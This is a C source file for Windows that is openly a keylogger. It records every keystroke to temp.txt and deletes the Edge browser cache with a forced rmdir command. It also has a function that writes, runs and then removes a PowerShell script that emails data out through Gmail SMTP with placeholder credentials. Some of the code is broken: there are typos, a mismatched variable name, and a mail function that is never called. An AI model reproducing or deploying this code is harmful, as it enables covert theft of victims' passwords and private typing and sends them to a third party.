#include <stdio.h>
#include <windows.h>
#include <dirent.h>
#include <errno.h>
#include <winuser.h>


/* Function declation*/
int DirectoryCheck(const char *director);
void ClearEdgeCache(const char *user_name);
void ClearChromeCache(const char *user_name);
void SaveInput(char *input, char key);
void SendMail():



void ClearBrowserCache(const char *user_name)
{
    ClearEdgeCache(user_name);
    //ClearChromeCache(user_name);

}

// If the browser exists and cache for it
int DirectoryCheck(const char *directory)
{
    DIR *dir = opendir(directory);
    if(dir){
        closedir(dir);
        return 1;
    }
    else
        return -1;
}

int main()
{
    //get the username of the current user
    char username[64] = "";
    strcat(username, getenv("USERNAME"));
    //printf("%s\n",username);

    ClearBrowserCache(username);

    int counter = 0;
    char *input = (char*)malloc(128*sizeof(char));
    input[0] = '\0';
    while(1)
    {
        for(char i = 8; i<=190; i++)
        {
            if(GetAsyncKeyState(i) == -32767)
            {
                //printf("%c",i);
                counter++;
                SaveInput(input, i);

                if(counter == 8)
                {
                    counter = 0;
                    FILE *fp = fopen("temp.txt", "ab+");
                    fprintf(fp, "%s",input);
                    fclose(fp);
                    free(input);
                    input = (char*)malloc(128*sizeof(char));
                    input[0] = '\0';
                }
            }
        }
    }
    return 0;
}

void ClearEdgeCache(const char *user_name)
{
    //check if microsoft exists on the device 
    char *location = (char*)malloc(256*sizeof(char));
    char *remove_path = (char*)malloc(256*sizeof(char));

    remove_path[0] = '\0';
    location[0]='\0';

    strcat(location, "C:\\Users\\");
    strcat(location, user_name);
    strcat(location, "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\");
    //printf("%s\n",location);

    if(DirectoryCheck(location)==1)
    {
        strcat(remove_path, "rmdir /Q /S \"");
        strcat(remove_path, location);
        strcat(remove_path, "\"");
        //printf("%s\n",remove_path);//check
        system(remove_path);
        //printf("%d\n",a);//check

        char *create_path = (char*)malloc(256*sizeof(char));
        create_path[0] = '\0';

        strcat(create_path, "mkdir \"");
        strcat(create_path, location);
        strcat(create_path, "\"");
        //printf("%s\n",create_path);//check
        system(create_path);
        //printf("%d\n",a);//check
        free(create_path);
    }

    free(location);
    free(remove_path);
}

void ClearChromeCache(const char *user_name)
{
    char *location = (char*)malloc(256*sizeof(char));
    char *remove_path = (char*)malloc(256*sizeof(char));

    remove_path[0] = '\0';
    location[0]='\0';

    strcat(location, "C:\\Users\\");
    strcat(location, user_name);
    strcat(location, "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\Cache_Data\\");
    //printf("%s\n",location);

    if(DirectoryCheck(location)==1)
    {
        strcat(remove_path, "rmdir /Q /S \"");
        strcat(remove_path, location);
        strcat(remove_path, "\"");
        //printf("%s\n",remove_path);//check
        system(remove_path);
        //printf("%d\n",a);//check

        char *create_path = (char*)malloc(256*sizeof(char));
        create_path[0] = '\0';

        strcat(create_path, "mkdir \"");
        strcat(create_path, location);
        strcat(create_path, "\"");
        //printf("%s\n",create_path);//check
        system(create_path);
        //printf("%d\n",a);//check
        free(create_path);
    }

    free(location);
    free(remove_path);
}

void SaveInput(char *input, char key)
{
    if(key == 8)
        strcat(input, "[BKSpace]");
    else if(key == 13)
        strcat(input, "\n");
    else if(key == 32)
        strcat(input, " ");
    else if(key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
        strcat(input,"[SHIFT]");
    else if(key == VK_CONTROL)
        strcat(input, "[Ctrl]");
    else if(key == VK_MENU)
        strcat(input, "[Alt]");
    else if(key == VK_CAPITAL)
        strcat(input, "[CapsLock]");
    else if(key == VK_ADD)
        strcat(input, "+");
    else if(key == VK_SUBTRACT)
        strcat(input, "-");
    else if(key == VK_DIVIDE)
        strcat(input, "\\");
    else if(key == VK_OEM_PERIOD)
        strcat(input, ".");
    else if(key == VK_OEM_COMMA)
        strcat(input, ",");
    else if(key == VK_HOME)
        strcat(input, "[Home]");
    else
    {
        char temp[2] = " ";
        temp[0] = key;
        temp[1] = '\0';
        strcat(input, temp);
    }
}

void SendMail()
{
    FILE *fp = fopen("mail.ps1", "ab+");
    fprintf(fp, "$from=\"the_mail_used_to_sent\"\n");
    fprintf(fp, "$from_pass=\"password_of_from_mail\"\n");
    fprintf(fp, "$smpt=\"smtp.gmail.com\"\n");
    fprintf(fp, "$to=\"the_mail_where_to_sent\"\n");
    fprintf(fp, "$subject=\"Keylogger\"\n");
    fprintf(fp, "$body=\"simple description\"\n");
    fprintf(fp, "$secure_password=\"Convertto-SecureString -String $from_pass -AsPlainText -force\"\n");
    fprintf(fp, "$my_credentials=New-Object System.Management.Automation.PSCredential $from, $secure_password\n");
    fprintf(fp, "Send-MailMessage -To $to -From $from -Subject $subject -Body $body -SmtpServer $smtp -Credential $my_credentials -UseSSL -Port 587 -DeliveryNotificationOption never\n");
    fclose(fp);
    char *syscall = (char*)malloc(100*sizeof(char));
    syscall[0]='\0';
    stcat(syscall,"powershell \"");
    char *curpath;
    curpath = _getcwd(NULL,0);
    strcat(syscall, curpath);
    strcat(syscall, "\\mail.ps1\"");
    system(syscall);
    remove("mail.ps1");
}